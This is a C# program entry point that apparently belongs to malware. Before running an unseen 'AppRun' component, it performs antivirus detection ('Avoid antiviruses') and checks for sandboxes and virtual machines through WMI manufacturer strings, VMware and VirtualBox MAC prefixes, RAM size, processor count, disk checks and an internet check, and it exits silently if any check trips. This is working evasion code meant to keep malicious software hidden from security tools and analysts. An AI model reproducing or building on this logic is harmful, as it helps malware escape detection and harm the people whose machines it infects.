using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.IO;

namespace abc
{
	static class Program
	{
		/// <summary>
		/// The main entry point for the application.
		/// </summary>
		[STAThread]
		static void Main()
		{
			// Avoid antiviruses
			if (FindEnemies.EnemiesHere())
				goto End;

			// detect virtual machines
			if (!Disk.HaveDDrive() || !Disk.HaveEnoughSpace())
				goto End;

			// detect virtual machines manufacturer
			using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (var items = searcher.Get())
				{
					foreach (var item in items)
					{
						string manufacturer = item["Manufacturer"].ToString().ToLower();
						if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
							|| manufacturer.Contains("vmware")
							|| item["Model"].ToString() == "VirtualBox")
						{
							goto End;
						}
					}
				}
			}

			// detect virtual network interface
			System.Net.NetworkInformation.NetworkInterface[] interfaces = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
			foreach (System.Net.NetworkInformation.NetworkInterface n in interfaces)
			{
				if (n.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up)
				{
					string MAC = n.GetPhysicalAddress().ToString();
					if (MAC.StartsWith("005056") || MAC.StartsWith("000C29") || MAC.StartsWith("001C14") || MAC.StartsWith("000569") || MAC.StartsWith("080027"))
					{
						goto End;
					}
				}
			}
			// end

			// check total RAM, if it's less than 1GB, the computer is virtual, then check the processor
			ulong totalMem = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory;
			if (totalMem / 1048576 < 1000)
			{
				goto End;
			}

			if (Environment.ProcessorCount % 2 != 0)
			{
				goto End;
			}

			if (!Connection.HaveInternet())
			{
				goto End;
			}

			AppRun abc =  new AppRun();
			Application.Run();

			End:
			string b = "c";
		}
	}
}
